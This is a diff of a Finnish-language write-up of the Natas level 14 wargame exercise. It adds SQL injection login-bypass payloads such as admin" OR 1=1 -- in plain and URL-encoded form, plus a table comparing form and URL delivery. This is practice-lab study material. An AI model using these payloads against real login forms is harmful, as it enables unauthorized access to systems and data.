@@ -204,20 +204,41 @@ Tämä enkodaattu pätee myös todellisuudessaan kirjauttumisen formaattissa ja 
 ![alt text](./kuvat-level11-15/natas14-13.png)
 
 Tämä enkoodattu (URL) 
-`username=admin%22%20OR%201%3D1%20--&password=admin` 
+`username=admin%22%20OR%201%3D1%20--&password=admin'` 
 vastaa --> 
-dekoodattua: 
-```username=admin" OR 1=1 --
+dekoodattua (alempi formaatti): 
+```
+username=admin" OR 1=1 --
 password=admin
 ```
 
-
-
 **TESTI10** ,  tämä on sama idea kuin _testi9_ , mutta mentiin lomakkeen formaattin kautta kirjauttumisen prosessilla. Molemmat ovat samoja sisältöjä, mutta eri kuljetusmuoto. 
+
+Alemman pieni toisto:
+```
+admin"' OR 1=1 --
+password' OR 1=1 --"
+```
+
 ![alt text](./kuvat-level11-15/natas14-14.png)
 ![alt text](./kuvat-level11-15/natas14-15.png)
 
 
+## SQL injektio mini huomio - START HERE 
+
+pieni huomiona tämä osuus:
+
+| Kenttä     | Syöte / URL                      | Arvo (selkokielisenä)                 | Ero ja merkitys                                                                 |
+|------------|----------------------------------|----------------------------------------|----------------------------------------------------------------------------------|
+| username   | Lomakesyöte                      | `admin"' OR 1=1 --`                    | Täysin identtinen injektio URL- ja lomakeversioissa.                            |
+| password   | Lomakesyöte                      | `password' OR 1=1 --"`                 | Alkuosa (`password`) eroaa, mutta injektio toimii jos SQL ei hajoa.             |
+| username   | URL (enkoodattu)                 | `admin"' OR 1=1 --`                    | Sama injektio kuin lomakkeessa, mutta URL-muodossa enkoodattuna.                |
+| password   | URL (enkoodattu)                 | `admin' OR 1=1 --"`                    | Eroaa lomakeversiosta alkuosan (`admin`) takia – voi vaikuttaa SQL-syntaksiin.  |
+| **KOKO URL** | `/index.php?...`                 | `username=admin"' OR 1=1 --`<br>`password=admin' OR 1=1 --"` | Käytännössä toimii kuten lomakesyöte, mutta erona on alkuarvon ero `password`-kentässä. |
+| username   | `username=admin%22%20OR%201%3D1%20--` | `admin" OR 1=1 --`                    | URL-enkoodattu versio: `%22` vastaa `"` ja `%20` vastaa välilyöntiä |
+
+
+SQL injektiossa idea on just nämä erikoismerkit kuten `"` , `'` , `"'`, `+` ja `--`. Huomoina toi keskimmäinen just pätee yhdistettynä, ja niiden yhdistelmeitä testeissä ja se pätee sekä lomakkeessa että URL:issa. 
 
 
 
